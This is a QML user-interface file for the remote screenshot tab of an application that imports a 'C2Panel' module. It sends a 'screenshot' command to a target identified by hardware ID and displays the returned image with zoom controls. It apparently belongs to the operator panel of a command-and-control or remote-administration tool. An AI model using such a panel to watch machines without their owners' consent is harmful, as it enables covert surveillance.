import QtQuick
import QtQuick.Controls
import QtQuick.Layouts
import C2Panel

Rectangle {
    id: screenTab
    property string serverUrl: ""
    property string cookie: ""
    property string hwid: ""
    property string screenshotBase64: ""
    color: "transparent"

    ColumnLayout {
        anchors.fill: parent; anchors.margins: Theme.spacingM; spacing: Theme.spacingS

        // 工具栏
        RowLayout {
            Layout.fillWidth: true; spacing: 8
            Text { text: "远程截屏"; font.pixelSize: 16; font.bold: true; color: Theme.textPrimary }

            ComboBox {
                id: scaleCombo
                model: ["原始 (1x)", "半屏 (2x)", "四分之一 (4x)"]
                currentIndex: 1
            }

            Button {
                text: mcp.busy ? "截取中..." : "📸 截屏"
                enabled: !mcp.busy && hwid
                onClicked: {
                    var scale = [1, 2, 4][scaleCombo.currentIndex]
                    mcp.callTool(hwid, serverUrl, cookie, "screenshot",
                        JSON.stringify({scale: scale}))
                }
            }

            Item { Layout.fillWidth: true }

            // 缩放控制
            Button { text: "−"; onClicked: zoomOut() }
            Text { id: zoomLabel; text: "100%"; font.pixelSize: 12; width: 40; horizontalAlignment: Text.AlignHCenter }
            Button { text: "+"; onClicked: zoomIn() }
            Button { text: "适应"; onClicked: fitToWindow() }
        }

        // 截图显示区
        Rectangle {
            Layout.fillWidth: true; Layout.fillHeight: true
            color: "#1E1E2E"; radius: Theme.radiusS
            clip: true

            Flickable {
                id: flickable
                anchors.fill: parent; anchors.margins: 12
                // 尺寸由 image 的 width/height 真实承载，这里直接跟随，
                // 不再 width*scale（重复计入 + 以中心缩放 → 放大后拖不到右下角）
                contentWidth: image.width
                contentHeight: image.height
                clip: true
                boundsBehavior: Flickable.StopAtBounds

                Image {
                    id: image
                    property real imageScale: 1.0
                    transformOrigin: Item.TopLeft
                    width: sourceSize.width * imageScale
                    height: sourceSize.height * imageScale
                    fillMode: Image.Stretch
                    smooth: true; asynchronous: true

                    BusyIndicator {
                        anchors.centerIn: parent
                        running: image.status === Image.Loading
                        width: 48; height: 48
                    }

                    Text {
                        anchors.centerIn: parent
                        text: "点击「📸 截屏」获取远程画面"
                        color: Theme.textTertiary; font.pixelSize: 14
                        visible: image.status !== Image.Loading && !screenTab.screenshotBase64
                    }
                }
            }
        }

        // 底部状态
        Text {
            text: screenshotBase64 ? "尺寸: " + image.sourceSize.width + "x" + image.sourceSize.height + " | 缩放: " + Math.round(image.imageScale * 100) + "%" : ""
            font.pixelSize: 11; color: Theme.textTertiary
        }
    }

    Connections {
        target: mcp
        function onScreenshotReady(tool, base64, source) {
            screenTab.screenshotBase64 = base64
            image.source = "data:image/bmp;base64," + base64
        }
        function onToolResult(tool, result, source) {
            // 如果是 screen_info
            try {
                var obj = JSON.parse(result)
                if (obj.width) {
                    // screen_info 结果
                }
            } catch(e) {}
        }
    }

    function zoomIn() { image.imageScale = Math.min(3.0, image.imageScale + 0.25); updateZoom() }
    function zoomOut() { image.imageScale = Math.max(0.25, image.imageScale - 0.25); updateZoom() }
    function fitToWindow() { image.imageScale = 1.0; updateZoom() }
    function updateZoom() { zoomLabel.text = Math.round(image.imageScale * 100) + "%" }
}
